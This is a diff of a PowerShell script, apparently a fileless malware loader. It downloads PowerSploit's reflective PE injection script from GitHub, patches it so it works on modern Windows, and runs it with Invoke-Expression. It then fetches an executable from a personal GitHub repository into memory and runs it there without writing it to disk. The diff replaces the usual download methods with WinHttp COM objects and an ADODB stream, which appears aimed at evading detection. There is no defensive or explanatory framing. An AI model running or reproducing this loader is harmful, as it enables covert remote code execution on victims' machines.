@@ -1,17 +1,44 @@
-# 1. Download the original PowerSploit code as a text string
-$RawScript = (Invoke-WebRequest "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1").Content
+# ==============================================================================
+# 1. Download the PowerSploit code as a text string using WinHttp
+# ==============================================================================
+$hScript = New-Object -ComObject WinHttp.WinHttpRequest.5.1
+$hScript.Open('GET', 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1', $false)
+$hScript.Send()
 
-# 2. Patch the exact lines causing the "Ambiguous Match" crash on modern Windows
+# Extract the response as a text string
+$RawScript = $hScript.ResponseText
+
+# ==============================================================================
+# 2. Patch the "Ambiguous Match" crash for modern Windows
+# ==============================================================================
 $OldCode = "`$GetProcAddress = `$UnsafeNativeMethods.GetMethod('GetProcAddress')"
 $NewCode = "`$GetProcAddress = `$UnsafeNativeMethods.GetMethod('GetProcAddress', [type[]]@([System.Runtime.InteropServices.HandleRef], [string]))"
 $PatchedScript = $RawScript.Replace($OldCode, $NewCode)
 
-# 3. Load the patched code into memory
-iex $PatchedScript
+# Load the patched injection function into memory
+Invoke-Expression $PatchedScript
 
-# 2. Download your compiled C++ EXE into RAM as a byte array
-$EXEBytes = (New-Object System.Net.WebClient).DownloadData("https://github.com/Ghoat5/hello-world/raw/refs/heads/main/irm_payload.exe")
+# ==============================================================================
+# 3. Download the C++ EXE into RAM using WinHttp + ADODB Stream
+# ==============================================================================
+$hExe = New-Object -ComObject WinHttp.WinHttpRequest.5.1
+$hExe.Open('GET', 'https://github.com/Ghoat5/hello-world/raw/refs/heads/main/test.exe', $false)
+$hExe.Send()
 
-# 3. Execute the EXE filelessly, passing arguments directly into memory
-# Minimized execution string
+# Initialize an binary stream to read the COM raw response safely into a byte array
+$Stream = New-Object -ComObject ADODB.Stream
+$Stream.Type = 1 # adTypeBinary
+$Stream.Open()
+$Stream.Write($hExe.ResponseBody)
+$Stream.Position = 0
+
+# Store the final payload into the byte array
+[byte[]]$EXEBytes = $Stream.Read()
+
+# Clean up COM stream resources
+$Stream.Close()
+
+# ==============================================================================
+# 4. Execute the EXE filelessly in the current process memory space
+# ==============================================================================
 Invoke-ReflectivePEInjection -PEBytes $EXEBytes -ForceASLR
